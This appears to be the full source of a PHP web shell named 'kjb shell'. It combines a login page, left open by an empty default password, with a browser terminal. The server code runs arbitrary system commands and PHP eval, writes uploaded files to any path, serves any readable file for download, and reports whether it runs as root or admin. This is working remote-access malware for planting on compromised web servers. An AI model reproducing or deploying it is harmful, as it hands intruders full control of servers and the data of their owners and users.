<?php $password = ""; define("password", $password); function success($data) { respond(200, array_merge($data, array("cwd" => getcwd()))); } function error($msg, $dat = "") { respond(400, array("errmsg" => $msg, "dat" => $dat)); } function respond($rc, $data) { http_response_code($rc); $out = "KJB_" . $GLOBALS["delimiter"] . "_BEGIN " . base64_encode(json_encode(utf8_encode_obj($data))) . " KJB_" . $GLOBALS["delimiter"] . "_END"; try { header('Content-Type: text/plain; charset=UTF-8'); header('Content-Length: ' . strlen($out)); } catch (Exception $e) { } echo $out; exit(0); } function is_authenticated() { return isset($_COOKIE["auth"]) && $_COOKIE["auth"] === password || password === ""; } if ($_SERVER["REQUEST_METHOD"] === "GET") { if (isset($_GET["download"])) { function handle_download($file) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($file) . '"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); flush(); readfile($file); flush(); exit; } handle_download($_GET["download"]); exit(0); } } if ($_SERVER["REQUEST_METHOD"] === "POST") { function run($password) { $_POST = json_decode(file_get_contents('php://input'), true); if (!isset($_POST["req"])) { error("No data supplied."); } $data = $_POST["req"]; $GLOBALS["delimiter"] = $data["delimiter"]; if (($password === "" || isset($data["auth"]) && $data["auth"] === $password) && !is_authenticated()) { $_SESSION["auth"] = true; success_msg("Authenticated"); } if (!is_authenticated()) { error("Please authenticate"); } $command = $data["cmd"]; if (!isset($command)) { error("Unknown command."); } $cmdData = $data["body"]; $cwd = $data["cwd"]; if (isset($cwd) && $cwd !== "") { chdir($cwd); } try { handle($command, $cmdData); } catch (Exception $e) { error("Exception happened", array("excpmsg" => ($e->getMessage()))); } } function handle($command, $data) { switch ($command) { case "info": handle_info(); break; case "exec": handle_exec($data); break; case "eval": handle_eval($data); break; case "cd": handle_cd($data); break; case "check_downloadable": handle_check_downloadable($data); break; case "upload": handle_upload($data); } } function windows_summary() { $is_admin_check = "net session 1>NUL 2>NUL || echo false"; $is_admin_res = exec_cmd($is_admin_check); return array( "username" => exec_cmd("whoami"), "isSuperUser" => $is_admin_res[0] !== "false" ); } function linux_summary() { $is_root_res = exec_cmd("whoami"); return array( "username" => $is_root_res, "isSuperUser" => $is_root_res[0] === "root" ); } function is_windows() { return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'; } function handle_info() { $res = array( "os" => php_uname("s"), "hostname" => php_uname("n"), "release" => php_uname("r"), "version" => php_uname("v"), "machine" => php_uname("m"), "all" => php_uname("a"), "writeable" => is_writeable(getcwd()) ); if (is_windows()) { $res = array_merge($res, windows_summary()); } else { $res = array_merge($res, linux_summary()); } success($res); } function handle_eval($data) { $res = eval($data["payload"]); success(array("result" => $res)); } function handle_cd($data) { chdir($data["path"]); success(array()); } function exec_cmd($cmd) { try { if (function_exists("exec")) { exec($cmd, $output); $output = implode($output, "\n"); } else if (function_exists("shell_exec")) { $output = shell_exec($cmd); } else if (function_exists("system")) { ob_start(); system($cmd); $output = ob_get_contents(); ob_end_clean(); } else if (function_exists("passthru")) { ob_start(); passthru($cmd); $output = ob_get_contents(); ob_end_clean(); } else { error("Command execution not possible, all functions disabled."); return null; } } catch (Exception $e) { return null; } return $output; } function handle_exec($data) { $input = $data["payload"]; $output = exec_cmd($input); if (is_null($output)) { error("Exception happened"); } if ($output === "") { error("KJB NORESP"); } success(array("output" => explode("\n", utf8_encode_obj($output)))); } function utf8_encode_obj($obj) { if (!function_exists("utf8_encode")) { return $obj; } if (is_array($obj)) { foreach ($obj as $key => $value) { $obj[$key] = utf8_encode_obj($value); } } else if (is_string($obj)) { return utf8_encode($obj); } return $obj; } function handle_upload($data) { $filePath = $data["path"]; $content = $data["content"]; $handle = @fopen($filePath, "wb"); if ($handle === false) { error("File could not be uploaded."); } else { fwrite($handle, base64_decode($content)); fclose($handle); success(array("success" => true, "path" => $filePath)); } } function handle_check_downloadable($data) { success(array("exists" => file_exists($data["file"]), "is_readable" => is_readable($data["file"]))); } function success_msg($msg) { success(array("succmsg" => $msg)); } run($password); exit(0); } ?> <?php if (!is_authenticated()) { ?> <html> <head> <meta charset="utf-8"> <meta http-equiv="content-type" content="text/html; charset=utf-8"/> <title>Auth</title> <style> </style> </head> <form> <input type="password" id="pwd"> <input type="button" id="sbm" value="+"> </form> <script> "use strict";function KjbElement(t){this.node=t,this.getVal=function(){return this.node.value},this.setVal=function(t){return this.node.value=t,this},this.click=function(){return this.node.click(),this},this.on=function(t,e){return"click"===t?this.node.onmousedown=e:"keydown"===t?this.node.onkeydown=e:"keypress"===t?this.node.onkeypress=e:"keyup"===t?this.node.onkeyup=e:"change"===t?this.node.onchange=e:"load"===t&&(this.node.onload=e),this},this.addClass=function(t){return this.node.classList.add(t),this},this.removeClass=function(t){return this.node.classList.remove(t),this},this.focus=function(){return this.node.focus(),this},this.setProp=function(t,e){return this.node.setAttribute(t,e),e||this.node.removeAttribute(t),this},this.getProp=function(t){return this.node.getAttribute(t)},this.setHtml=function(t){return this.node.innerHTML=t,this},this.setStyle=function(t,e){return this.node.style[t]=e,this},this.getHtml=function(){return this.node.innerHTML},this.setText=function(t){return this.node.textContent=t,this},this.getText=function(){return this.node.textContent},this.scrollToBottom=function(){return this.node.scrollTop=this.node.scrollHeight,this},this.append=function(t){return this.node.appendChild(t.node),this},this.empty=function(){for(;this.node.firstChild;)this.node.removeChild(this.node.firstChild);return this}}const $=t=>{if(t===document)return new KjbElement(document);if(0===t.indexOf("<")&&t.indexOf(">")===t.length-1){const e=document.createTextNode(""),n=document.createElement(t.substring(1,t.length-1));return n.appendChild(e),new KjbElement(n)}return new KjbElement(document.querySelector(t))}; "use strict";let lastResponse=void 0,cwd="";const xhrIndicators={},removeFromArray=(e,t)=>{e.splice(e.indexOf(t),1)};let onCwdUpdated=e=>{};const onProgress=(e,t,o=!1)=>n=>{handleProgress(n,e,t,o)},hc=(e,t,o)=>e+t+JSON.stringify(o),handleProgress=(e,t,o,n)=>{const r=getPercentage(e.total,e.loaded);let s=xhrIndicators[hc(e.target,t,o)];s||(s=createXhrIndicator(e.target,t,o)),new KjbElement(s.node.lastChild).setText(r),n&&(xhrIndicators[hc(e.target,t,o)]=void 0,s.node.remove())},createXhrIndicator=(e,t,o)=>{const n=$("<div>").addClass("indicator").append($("<div>").setText(((e,t,o)=>{let n="Download";return e.toString().toLowerCase().includes("upload")&&(n="Upload"),`${n} ${t}`})(e,t)).addClass("reqName")).append($("<div>").setStyle("width","0.5em")).append($("<div>").addClass("reqPercent").setText("..."));return $("#targetInfo").append(n),xhrIndicators[hc(e,t,o)]=n,n},getPercentage=(e,t)=>(0===e&&(t=1,e=1),Math.round(t/e*100)+"%"),request=(e,t,o,n,r=!1)=>{const s=new XMLHttpRequest,a=generateId(64);return s.upload.onprogress=onProgress(e,t),s.upload.onload=onProgress(e,t),s.upload.onloadend=onProgress(e,t,!0),s.upload.onloadstart=onProgress(e,t),s.onprogress=onProgress(e,t),s.onload=onProgress(e,t),s.onloadend=onProgress(e,t,!0),s.onloadstart=onProgress(e,t),s.onreadystatechange=function(){if(4===s.readyState){let e;if(r)e=s.responseText;else try{const t=s.responseText,o=`KJB_${a}_BEGIN`,r=`KJB_${a}_END`,d=t.indexOf(o)+o.length,l=t.lastIndexOf(r);e=JSON.parse(atob(t.slice(d,l))),lastResponse=e}catch(e){return lastResponse=void 0,void n(s.status,e)}200!==s.status||e.errmsg?n(s.status,e):(r||handleData(e),o(e))}},s.open("POST",document.location,!0),s.setRequestHeader("Content-Type","application/json; charset=utf-8"),s.send(JSON.stringify({req:{cwd:cwd,cmd:e,body:t,delimiter:a}})),s},generateId=e=>{let t="";const o="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";for(let n=0;n<e;n++)t+=o.charAt(Math.floor(Math.random()*o.length));return t},requestExec=(e,t,o)=>{request("exec",{payload:e},t,o)},requestEval=(e,t,o)=>{},requestDownload=e=>{const t=`${window.location}/?download=`+encodeURIComponent(cwd+"/"+e);log(`Downloading ${e} from ${t}`),window.open(t)},requestCheckDownloadable=(e,t,o)=>{request("check_downloadable",{file:e},t,o)},requestUpload=(e,t,o,n)=>{request("upload",{path:e,content:t},o,n)},requestCd=(e,t,o)=>request("cd",{path:e},t,o),requestInfo=(e,t)=>request("info",{},e,t),handleData=e=>{cwd=e.cwd,onCwdUpdated(cwd)}; const auth = (pwd) => { document.cookie = "auth=" + pwd; location.reload(true); }; $("#sbm").on("click", () => { auth($("#pwd").getVal()); }); </script> </html> <?php } else { ?> <html> <head> <meta charset="utf-8"> <meta http-equiv="content-type" content="text/html; charset=utf-8"/> <title>kjb shell</title> <style> :root{--bg:#002b36;--bg-dark:#001e25;--fg:#fdf6e3;--hint-bg:#268bd2;--err-fg:#dc322f;--cmd:#93a1a1;--fsize:1em}body{margin:0}#wrapper,#wrapper *{margin:0;padding:0;background-color:var(--bg);font-family:Consolas,monospace,sans-serif;color:var(--fg);font-size:var(--fsize)}#wrapper{height:100%;width:100%;box-sizing:border-box!important;padding:.5em!important} #targetInfo { display: flex; position: absolute; top: 0; right: 0; flex-flow: column; width: fit-content; height: fit-content; margin: 0.25em 0.25em; text-align: right; background-color: transparent; pointer-events: none; max-width: 33% !important; } .indicator { background-color: #657b83 !important; } .reqName { } .reqPercent { } .indicator * { background-color: #657b83 !important; padding: 0 !important; margin: 0 !important; } #targetInfo * { pointer-events: none; display: flex; padding: 0.25em 0.5em; flex-shrink: 1; align-self: end; margin-bottom: 0.25em; } #shell { display: flex; flex-flow: column; position: relative; height: 100%; width: 100%; } #bufferWrapper { overflow: scroll; overflow-x: hidden; flex: 1 1 auto; } .logError { color: var(--err-fg); } #inputWrapper { padding: 0.25em; height: 1.75em; display: flex; flex-flow: row; background-color: transparent; z-index: 1000; } #inputCwd { flex: fit-content; background-color: var(--hint-bg); color: var(--bg); } #inputCurrHost { flex: fit-content; background-color: var(--bg-dark); color: var(--hint-bg); } .logSpace { height: 1em; } #inputWrapper * { padding: 0.25em 0.5em; } .logCommand { color: var(--cmd); font-weight: bold; } .targetInfoOs { background-color: #6c71c4 !important; } .targetInfoSuperUser { background-color: #dc322f !important; } #input { border: none; caret-shape: block !important; flex: 1 1 auto; padding: 0 !important;; margin-left: 0.5em; } .inputElement { } .logElement { } .hidden { display: none; } #wrapper { padding: 0.1em; } </style> </head> <body> <div class="hidden"> <form method="post" enctype="multipart/form-data"> <input id="fileUpload" type="file" name="file"/> </form> </div> <div id="wrapper"> <div id="shell"> <div id="targetInfo"> <div class="targetInfoOs targetInfoEl">...</div> <div class="targetInfoSuperUser targetInfoEl">...</div> <div style="margin: 0.25em; background-color: transparent;"></div> </div> <div id="bufferWrapper"> <ul id="buffer"> </ul> </div> <div id="inputWrapper"> <div id="inputCurrHost" class="inputElement"></div> <div id="inputCwd" class="inputElement"></div> <input type="text" autofocus id="input"> </div> </div> </div> <script> "use strict";function KjbElement(t){this.node=t,this.getVal=function(){return this.node.value},this.setVal=function(t){return this.node.value=t,this},this.click=function(){return this.node.click(),this},this.on=function(t,e){return"click"===t?this.node.onmousedown=e:"keydown"===t?this.node.onkeydown=e:"keypress"===t?this.node.onkeypress=e:"keyup"===t?this.node.onkeyup=e:"change"===t?this.node.onchange=e:"load"===t&&(this.node.onload=e),this},this.addClass=function(t){return this.node.classList.add(t),this},this.removeClass=function(t){return this.node.classList.remove(t),this},this.focus=function(){return this.node.focus(),this},this.setProp=function(t,e){return this.node.setAttribute(t,e),e||this.node.removeAttribute(t),this},this.getProp=function(t){return this.node.getAttribute(t)},this.setHtml=function(t){return this.node.innerHTML=t,this},this.setStyle=function(t,e){return this.node.style[t]=e,this},this.getHtml=function(){return this.node.innerHTML},this.setText=function(t){return this.node.textContent=t,this},this.getText=function(){return this.node.textContent},this.scrollToBottom=function(){return this.node.scrollTop=this.node.scrollHeight,this},this.append=function(t){return this.node.appendChild(t.node),this},this.empty=function(){for(;this.node.firstChild;)this.node.removeChild(this.node.firstChild);return this}}const $=t=>{if(t===document)return new KjbElement(document);if(0===t.indexOf("<")&&t.indexOf(">")===t.length-1){const e=document.createTextNode(""),n=document.createElement(t.substring(1,t.length-1));return n.appendChild(e),new KjbElement(n)}return new KjbElement(document.querySelector(t))}; "use strict";let lastResponse=void 0,cwd="";const xhrIndicators={},removeFromArray=(e,t)=>{e.splice(e.indexOf(t),1)};let onCwdUpdated=e=>{};const onProgress=(e,t,o=!1)=>n=>{handleProgress(n,e,t,o)},hc=(e,t,o)=>e+t+JSON.stringify(o),handleProgress=(e,t,o,n)=>{const r=getPercentage(e.total,e.loaded);let s=xhrIndicators[hc(e.target,t,o)];s||(s=createXhrIndicator(e.target,t,o)),new KjbElement(s.node.lastChild).setText(r),n&&(xhrIndicators[hc(e.target,t,o)]=void 0,s.node.remove())},createXhrIndicator=(e,t,o)=>{const n=$("<div>").addClass("indicator").append($("<div>").setText(((e,t,o)=>{let n="Download";return e.toString().toLowerCase().includes("upload")&&(n="Upload"),`${n} ${t}`})(e,t)).addClass("reqName")).append($("<div>").setStyle("width","0.5em")).append($("<div>").addClass("reqPercent").setText("..."));return $("#targetInfo").append(n),xhrIndicators[hc(e,t,o)]=n,n},getPercentage=(e,t)=>(0===e&&(t=1,e=1),Math.round(t/e*100)+"%"),request=(e,t,o,n,r=!1)=>{const s=new XMLHttpRequest,a=generateId(64);return s.upload.onprogress=onProgress(e,t),s.upload.onload=onProgress(e,t),s.upload.onloadend=onProgress(e,t,!0),s.upload.onloadstart=onProgress(e,t),s.onprogress=onProgress(e,t),s.onload=onProgress(e,t),s.onloadend=onProgress(e,t,!0),s.onloadstart=onProgress(e,t),s.onreadystatechange=function(){if(4===s.readyState){let e;if(r)e=s.responseText;else try{const t=s.responseText,o=`KJB_${a}_BEGIN`,r=`KJB_${a}_END`,d=t.indexOf(o)+o.length,l=t.lastIndexOf(r);e=JSON.parse(atob(t.slice(d,l))),lastResponse=e}catch(e){return lastResponse=void 0,void n(s.status,e)}200!==s.status||e.errmsg?n(s.status,e):(r||handleData(e),o(e))}},s.open("POST",document.location,!0),s.setRequestHeader("Content-Type","application/json; charset=utf-8"),s.send(JSON.stringify({req:{cwd:cwd,cmd:e,body:t,delimiter:a}})),s},generateId=e=>{let t="";const o="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";for(let n=0;n<e;n++)t+=o.charAt(Math.floor(Math.random()*o.length));return t},requestExec=(e,t,o)=>{request("exec",{payload:e},t,o)},requestEval=(e,t,o)=>{},requestDownload=e=>{const t=`${window.location}/?download=`+encodeURIComponent(cwd+"/"+e);log(`Downloading ${e} from ${t}`),window.open(t)},requestCheckDownloadable=(e,t,o)=>{request("check_downloadable",{file:e},t,o)},requestUpload=(e,t,o,n)=>{request("upload",{path:e,content:t},o,n)},requestCd=(e,t,o)=>request("cd",{path:e},t,o),requestInfo=(e,t)=>request("info",{},e,t),handleData=e=>{cwd=e.cwd,onCwdUpdated(cwd)}; "use strict";const log=e=>{const o=$("<pre>").addClass("logElement").setText(e);return buffer.append(o),bufferWrapper.scrollToBottom(),bufferWrapper.node.scrollTo(0,bufferWrapper.node.scrollHeight),o},logMultiline=e=>{const o=[];return e.split("\n").forEach(e=>{o.push(log(e))}),o},logCommand=e=>log(e).addClass("logCommand"),colorize=(e,o)=>(e.setStyle("color",o),e),logSpace=()=>{log("").addClass("logSpace")},logError=e=>{log(e).addClass("logError")},escapeHtml=e=>{const o=document.createTextNode(e),r=document.createElement("div");return r.appendChild(o),r.innerHTML},encodeWhiteSpaces=e=>e.split("").map(function(e){return" "===e?"&nbsp;":e}).join(""),clearLog=()=>{buffer.empty()}; const commands={},addCommand=(o,e,a,d)=>{commands[o.trim().toLowerCase()]={syntax:e,description:a,executor:d}},printCommands=()=>{const o=Object.values(commands).map(o=>o.syntax.length).reduce((o,e)=>o>e?o:e);colorize(log("Available commands:"),"#93a1a1"),Object.keys(commands).forEach(e=>{const a=commands[e];log(a.syntax.padEnd(o," ")+" | "+a.description)})},initCommands=()=>{addCommand("kjb","kjb","Show the list of kjb commands",commandHelp),addCommand("cd","cd <directory>","Change directory",commandChangeDirectory),addCommand("clear","clear","Clear the kjb log",commandClear),addCommand("hide","hide (info|preinput)","Hide some ui elements",commandHide),addCommand("download","download <file>","Download a file",commandDownload),addCommand("upload","upload","Upload a file",commandUpload),$("#fileUpload").on("change",commandUploadListener)},getCommandName=o=>{let e;return(e=o.indexOf(" ")&&-1!==o.indexOf(" ")?o.slice(0,o.indexOf(" ")):o).toLowerCase().trim()},getCommandArgs=o=>o.slice(getCommandName(o).length).trim(),printSyntax=o=>{log("Wrong usage! Correct syntax: "+o.syntax)},handleInternally=o=>{const e=commands[getCommandName(o)];return!!e&&(!!e.executor(getCommandArgs(o))||(printSyntax(e),!0))},commandClear=o=>(clearLog(),!0),commandDownload=o=>!(!o||0===o.length)&&(log("Checking if file is downloadable ..."),requestCheckDownloadable(o,e=>{e.exists?e.is_readable?requestDownload(o):logError("Error while downloading: File is not readable!"):logError("Error while downloading: File does not exist!")},handleError(o=>{const{errmsg:e}=o;logError("Error while downloading: "+e)})),!0),commandUpload=o=>($("#fileUpload").click(),!0),appendBaseIfNecessary=o=>{let e=cwd;return e.endsWith("/")||(e+="/"),(o.startsWith("/")||1===o.indexOf(":"))&&(e=""),e+o},commandUploadListener=()=>{const o=$("#fileUpload").node.files[0];if(!o)return void log("Cancelled upload.");log("Uploading file '"+o.name+"'");const e=appendBaseIfNecessary(o.name),a=new FileReader;a.readAsDataURL(o),a.onload=(a=>{const d=a.target.result.match(/base64,(.*)$/)[1];requestUpload(o.name,d,o=>{log(`Upload successful, path is: ${e}`)},handleError(o=>{const{errmsg:e}=o;logError(`Error whilst uploading: ${e}`)}))})},commandHide=o=>{if("info"===o){const o=$("#targetInfo");return o.node.style.display="none"===o.node.style.display?"flex":"none",log("Toggled target information display."),!0}if("preinput"===o){const o=$("#inputCurrHost"),e=$("#inputCwd");return o.node.style.display="none"===o.node.style.display?"inline-block":"none",e.node.style.display="none"===e.node.style.display?"inline-block":"none",log("Toggled user and cwd information display."),!0}},commandChangeDirectory=o=>{if(!o||0===o.length)return!1;let e=!0;return requestCd(o,o=>{},handleError(o=>{logError("Could not change directory."),e=!1})),e},commandHelp=o=>{printCommands()};addCommand("kjb","kjb","Show the list of kjb commands",commandHelp),addCommand("cd","cd <directory>","Change directory",commandChangeDirectory),addCommand("clear","clear","Clear the kjb log",commandClear),addCommand("hide","hide (info|preinput)","Hide some ui elements",commandHide),addCommand("download","download <file>","Download a file",commandDownload),addCommand("upload","upload","Upload a file",commandUpload),$("#fileUpload").on("change",commandUploadListener); const buffer = $("#buffer"); const shell = $("#shell"); const input = $("#input"); const bufferWrapper = $("#bufferWrapper"); let currInfo = {}; const setInputHint = (hint) => { $("#inputCwd").setText(`${hint}`); }; const setInputCurrHost = (currHost) => { $("#inputCurrHost").setText(`${currHost}`); }; const updateInfo = (info) => { currInfo = info; let username = info.username; if (username.indexOf("\\") !== -1) { username = username.slice(username.indexOf("\\") + 1); } setInputCurrHost(`${username}@${info.hostname}`); $(".targetInfoOs").setText(info.all); $(".targetInfoSuperUser").setText(info.isSuperUser ? "you have root!" : "you don't have root") }; const init = () => { onCwdUpdated = (cwd) => { setInputHint(cwd); }; input.on("keydown", ev => { handleInputKeyEvent(ev.keyCode); }); loadInfo(); }; const loadInfo = () => { log("Sending initial request, please wait..."); requestInfo((data) => { clearLog(); updateInfo(data); colorize(log("Welcome to kjb shell!"), "#268bd2"); logSpace(); printCommands(); logSpace(); }, handleError(err => { logError("Don't know how to proceed."); })); }; const handleInputKeyEvent = (kc) => { if (kc === 13) { if (input.getVal() === "") { return; } submit(input.getVal()); input.setVal(""); } }; const submit = (cmd) => { cmd = cmd.trim(); logSpace(); const msg = logCommand("kjb# " + cmd); if (handleInternally(cmd)) { return; } msg.setText(cwd + "# " + cmd); requestExec(cmd, (data) => { data.output.forEach(line => log(line)); }, handleError(err => { const {errmsg} = err; if (isKjbErr(errmsg)) { logError("No response received."); } })) }; const isKjbErr = (msg) => { return msg.indexOf("KJB") !== -1; }; const handleError = (then) => { return (status, err) => { const {errmsg} = err; if (!isKjbErr(errmsg)) { logError("An error has happened: " + errmsg); logError("Response: " + JSON.stringify(err)); } if (then) { then(err); } } }; init(); </script> </body> </html> <?php } ?>